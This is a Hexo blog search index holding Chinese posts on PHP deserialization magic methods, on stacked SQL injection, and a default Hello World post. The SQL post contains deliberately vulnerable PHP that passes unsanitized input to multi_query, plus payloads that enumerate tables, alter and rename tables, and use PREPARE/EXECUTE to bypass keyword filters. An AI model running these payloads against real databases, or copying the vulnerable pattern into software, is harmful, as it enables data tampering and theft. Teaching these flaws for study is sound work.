<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>PHP反序列化漏洞</title>
      <link href="/2019/05/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/05/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>​*最近再次遇见了反序列化漏洞，感觉还是很有意思，就又又又学习了一下。😅</p><h3 id="php对象序列化-手册"><a class="header-anchor" href="#php对象序列化-手册">¶</a>PHP对象序列化  (<a href="https://www.php.net/manual/zh/language.oop5.serialization.php" target="_blank" rel="noopener">手册</a>)</h3><ul><li>序列化(serialize())  对象-&gt;字符串</li><li>反序列化(unserialize()) 字符串-&gt;对象</li></ul><h3 id="反序列化漏洞"><a class="header-anchor" href="#反序列化漏洞">¶</a>反序列化漏洞</h3><p>  序列化与反序列化本身没有漏洞，触发漏洞的点如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">反序列化函数 unserialize() 中存在可控参数</span><br><span class="line">魔术方法中有敏感操作</span><br></pre></td></tr></table></figure><h3 id="魔术方法"><a class="header-anchor" href="#魔术方法">¶</a>魔术方法</h3><p>  php中的魔术方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">函数名 函数作用 </span><br><span class="line">__construct() 类的构造函数 </span><br><span class="line">__destruct() 类的析构函数 </span><br><span class="line">__call() 在对象中调用一个不可访问方法时调用 </span><br><span class="line">__callStatic() 用静态方式中调用一个不可访问方法时调用 </span><br><span class="line">__get() 获得一个类的成员变量时调用 </span><br><span class="line">__set() 设置一个类的成员变量时调用 </span><br><span class="line">__isset() 当对不可访问属性调用isset()或empty()时调用 </span><br><span class="line">__unset() 当对不可访问属性调用unset()时被调用 </span><br><span class="line">__sleep() 执行serialize()时，先会调用这个函数 </span><br><span class="line">__wakeup() 执行unserialize()时，先会调用这个函数 </span><br><span class="line">__toString() 类被当成字符串时的回应方法 </span><br><span class="line">__invoke() 调用函数的方式调用一个对象时的回应方法 </span><br><span class="line">__set_state() 调用var_export()导出类时，此静态方法会被调用 </span><br><span class="line">__clone() 当对象复制完成时调用 </span><br><span class="line">__debugInfo() 当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</span><br></pre></td></tr></table></figure><h3 id="示例"><a class="header-anchor" href="#示例">¶</a>示例</h3><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $nae;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__construct is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$arguments)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__call is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__callStatic</span><span class="params">($name, $arguments)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__callStatic is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__get is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($name,$value)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__set is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__isset is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__unset is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__sleep is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'nae'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__wakeup is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__toString is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'111&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__invoke is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__set_state</span><span class="params">($arr)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">'__set_state is ok'</span>;</span><br><span class="line"><span class="comment">// return '';</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__clone is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__destruct is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__debugInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'__debugInfo is ok'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实例化对象 __construct 被调用</span></span><br><span class="line">$a=<span class="keyword">new</span> test();</span><br><span class="line"><span class="comment">#设置类中没有的值时。__set 被调用</span></span><br><span class="line">$a-&gt;xvalue=<span class="string">'test'</span>;</span><br><span class="line"><span class="comment">#调用类中不可调用的方法时 __call被调用</span></span><br><span class="line">$a-&gt;nofun();</span><br><span class="line"><span class="comment">#读取不可访问或不存在属性时   __get 被调用</span></span><br><span class="line"><span class="keyword">echo</span> $a-&gt;xvalue;</span><br><span class="line"><span class="comment">#当对不可访问属性调用isset()或empty()时调用  __isset 被调用</span></span><br><span class="line"><span class="keyword">isset</span>($a-&gt;xvalue);</span><br><span class="line"><span class="comment">#当对不可访问属性调用unset()时被调用 </span></span><br><span class="line"><span class="keyword">unset</span>($a-&gt;xvalue);</span><br><span class="line"><span class="comment">#被当成函数调用时 __invoke被调用</span></span><br><span class="line">$a();</span><br><span class="line"><span class="comment">#调用类中不存在的静态方法时，__callStatic被调用</span></span><br><span class="line">$a::nofo();</span><br><span class="line"><span class="comment">#对象被复制的时候 __clone被调用。对象消失时__destruct也会被调用</span></span><br><span class="line">$a1 = <span class="keyword">clone</span> $a;</span><br><span class="line"><span class="comment">#序列化对象 __sleep 被调用</span></span><br><span class="line">$c=serialize($a);</span><br><span class="line"><span class="comment">#对象被当成字符串时， __toString被调用</span></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">#调用var_export()导出类时 __set_state 被调用</span></span><br><span class="line"><span class="comment">// var_export($a);</span></span><br><span class="line"><span class="keyword">eval</span>( <span class="string">'$a2 = '</span>  .  var_export ( $a ,  <span class="keyword">true</span> ) .  <span class="string">';'</span> );var_dump($a2);</span><br><span class="line"><span class="comment">#反序列化时  __wakeup 被调用  将字符串转化成 对象。对象消失 __destruct也会被调用</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br/&gt;'</span>;</span><br><span class="line">unserialize($c);</span><br><span class="line"><span class="comment">#打印调试信息 __debugInfo被调用</span></span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__construct is ok</span><br><span class="line">__set is ok</span><br><span class="line">__call is ok</span><br><span class="line">__get is ok</span><br><span class="line">__isset is ok</span><br><span class="line">__unset is ok</span><br><span class="line">__invoke is ok</span><br><span class="line">__callStatic is ok</span><br><span class="line">__clone is ok</span><br><span class="line">__sleep is ok</span><br><span class="line">__toString is ok</span><br><span class="line"><span class="number">111</span></span><br><span class="line">C:\phpStudy\WWW\test2.php:<span class="number">91</span>:string <span class="string">'__set_state is ok'</span> (length=<span class="number">17</span>)</span><br><span class="line">__wakeup is ok</span><br><span class="line">__destruct is ok</span><br><span class="line">__debugInfo is ok</span><br><span class="line">C:\phpStudy\WWW\test2.php:<span class="number">96</span>:</span><br><span class="line">object(test)[<span class="number">1</span>]</span><br><span class="line">__destruct is ok</span><br><span class="line">__destruct is ok</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sql注入--堆叠注入</title>
      <link href="/2019/05/29/Sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/05/29/Sql%E6%B3%A8%E5%85%A5-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="堆叠查询"><a class="header-anchor" href="#堆叠查询">¶</a>堆叠查询</h3><p>  在SQL中，分号表示已到达语句的结尾，后面的内容是新的。这允许在对数据库服务器的同一调用中执行多个语句。与仅限于SELECT语句的UNION攻击相反，<strong>堆叠查询可用于执行任何SQL语句或过程</strong>。使用此技术的经典攻击可能如下所示。(<a href="http://www.sqlinjection.net/stacked-queries/" target="_blank" rel="noopener">来自于</a>)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Stacked query support.</span><br><span class="line">MySQL/PHP - Not supported (supported by MySQL for other API).</span><br><span class="line">SQL Server/Any API - Supported.</span><br><span class="line">Oracle/Any API - Not supported.</span><br></pre></td></tr></table></figure><h3 id="堆叠注入-php-mysql"><a class="header-anchor" href="#堆叠注入-php-mysql">¶</a>堆叠注入(PHP+MYSQL)</h3><p>  当过滤了select|update|delete|drop|insert|where|.|时，又想获取当前数据库其他表字段值时就要想到堆叠注入啦。😏😏😏</p><p>关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $mysqli = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"supersql"</span>,<span class="string">"8889"</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    $sql = <span class="string">"select * from `table1` where id = '$id';"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($mysqli-&gt;multi_query($sql))&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($rs = $mysqli-&gt;store_result())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> ($mysqli-&gt;more_results())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>($mysqli-&gt;next_result()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();</span><br></pre></td></tr></table></figure><p>POC：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">爆字段当前数据库表字段的方法：</span><br><span class="line">    <span class="keyword">and</span> Polygon(id) --+</span><br><span class="line">    procedure analyse()--+</span><br><span class="line">    <span class="keyword">and</span> linestring(id)--+</span><br><span class="line">方法一：</span><br><span class="line">    $id = <span class="number">1</span><span class="string">';show tables from supersql;%23   //获取数据库中当前的所有表名</span></span><br><span class="line"><span class="string">    $id = 1'</span>;show create table xxx;   <span class="comment">//获取表结构</span></span><br><span class="line">    $id = <span class="number">1</span><span class="string">';alter table `table1` add(id int default 1);alter table table2 rename a;alter `table1` rename table2;%23.       //给table1 添加id字段，修改表名。</span></span><br><span class="line"><span class="string">方法二：</span></span><br><span class="line"><span class="string">    使用prepare语句使用</span></span><br><span class="line"><span class="string">    $id= 1'</span>; set @s=concat(%s);PREPARE a FROM @s;EXECUTE a; <span class="comment">//%s替换成语句，然后关键词使用char转换</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> Sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/05/27/hello-world/"/>
      <url>/2019/05/27/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="quick-start"><a class="header-anchor" href="#quick-start">¶</a>Quick Start</h2><h3 id="create-a-new-post"><a class="header-anchor" href="#create-a-new-post">¶</a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="run-server"><a class="header-anchor" href="#run-server">¶</a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="generate-static-files"><a class="header-anchor" href="#generate-static-files">¶</a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="header-anchor" href="#deploy-to-remote-sites">¶</a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
